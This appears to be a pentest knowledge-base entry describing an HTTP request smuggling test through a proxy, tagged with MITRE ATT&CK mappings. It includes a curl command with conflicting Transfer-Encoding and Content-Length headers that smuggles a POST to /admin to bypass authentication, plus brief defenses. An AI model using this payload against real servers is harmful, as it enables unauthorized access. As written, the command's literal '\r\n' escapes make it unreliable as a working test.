---
tags:
  - http-smuggling
  - proxy-testing
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Docker]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-proxy-smuggling-test]]'
platforms:
  - Linux
  - Windows
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f57bb8d1-ec8d-4523-9a41-54822f29984c
created_at: '2025-12-13T09:01:21.799Z'
updated_at: '2025-12-13T09:01:21.799Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test Smuggling with Proxy Setup

## Summary

This procedure tests HTTP Request Smuggling by routing a request with conflicting headers through a proxy that interprets Content-Length first, smuggling a malicious POST request.

## Description

Set up a test proxy (e.g., using Docker) and send a crafted request to demonstrate how different interpretations allow smuggling, potentially bypassing authentication to access /admin endpoints.

## Requirements

1. Test proxy server running on http://test-proxy:8080
2. cURL for sending requests
3. Target server for testing

## Defense

Defensive measures and detection strategies:

- Ensure proxies reject requests with conflicting headers
- Log and alert on unusual request patterns

## Objectives

1. Demonstrate smuggling through proxy
2. Verify inconsistent header parsing
3. Achieve potential authentication bypass

## Instructions

### Step 1: Send Request Through Proxy

**Context**: Configure proxy and send smuggled request.

**Command** ([[commands/curl-proxy-smuggling-test]]):
```bash
curl -v --proxy http://test-proxy:8080 -H "Transfer-Encoding: chunked" -H "Content-Length: 50" -X POST -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/public
```

> This sends the request via proxy, with the smuggled POST potentially processed separately. Observe proxy behavior in logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-proxy-smuggling-test]]

## Tools Used

- [[tools/curl]]
- [[tools/Docker]]

## Tags

- [[http-smuggling]]
- [[proxy-testing]]
